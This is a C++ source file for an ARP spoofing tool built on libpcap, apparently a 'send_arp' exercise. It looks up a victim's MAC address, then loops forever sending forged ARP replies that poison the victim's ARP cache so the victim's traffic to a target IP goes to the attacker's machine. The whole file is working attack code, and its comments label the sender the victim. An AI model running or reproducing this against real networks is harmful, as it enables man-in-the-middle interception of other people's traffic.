#include <arpa/inet.h>
#include <pcap/pcap.h>
#include <string.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include "arpspoof.hpp"

#define SET_IP(x, y) *(uint32_t *)(x) = y

#define RULE_SIZE 50
#define SEND_PERIOD 500000000

uint8_t mac_addr[6];
uint8_t ip_addr[4];

uint8_t sender_mac_addr[6];
uint8_t sender_ip_addr[4];

uint8_t target_ip_addr[4];

int main(int argc, char *argv[]) {
  pcap_t *pcap;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;

  char rule[RULE_SIZE];

  if (argc < 4) {
    puts("Usage: send_arp <interface> <sender ip> <target ip>");
    return 0;
  }

  memset(&fp, 0, sizeof(struct bpf_program));
  SET_IP(sender_ip_addr, inet_addr(argv[2]));
  SET_IP(target_ip_addr, inet_addr(argv[3]));

  // Print information
  parse_ioctl(argv[1], mac_addr, ip_addr);
  print_mac("MAC_ADDRESS", mac_addr);
  print_ip("IP_ADDRESS", ip_addr);

  // Open the output device
  if ((pcap = pcap_open_live(argv[1], 65536, 1, 1000, errbuf)) == NULL) {
    fprintf(stderr, "\nUnable to open the adapter. %s\n", argv[1]);
    exit(-1);
  }

  // Send ARP request packet to the victim to know MAC address of the victim
  sprintf(rule, "src host %u.%u.%u.%u arp", sender_ip_addr[0],
          sender_ip_addr[1], sender_ip_addr[2], sender_ip_addr[3]);
  send_arp_packet(pcap, mac_addr, ip_addr, NULL, sender_ip_addr, ARP_REQUEST);
  pcap_compile(pcap, &fp, rule, 1, 0xffffff00);
  pcap_setfilter(pcap, &fp);

  pcap_loop(pcap, 1, packet_handler, NULL);

  print_mac("VICTIM_MAC_ADDRESS", sender_mac_addr);
  print_ip("VICTIM_IP_ADDRESS", sender_ip_addr);

  print_ip("TARGET_IP_ADDRESS", target_ip_addr);

  while (true) {
    puts("send packet..");
    for(int i = 0; i < SEND_PERIOD; i++);
    send_arp_packet(pcap, mac_addr, target_ip_addr, sender_mac_addr,
                    sender_ip_addr, ARP_REPLY);
  }

  pcap_close(pcap);
  return 0;
}
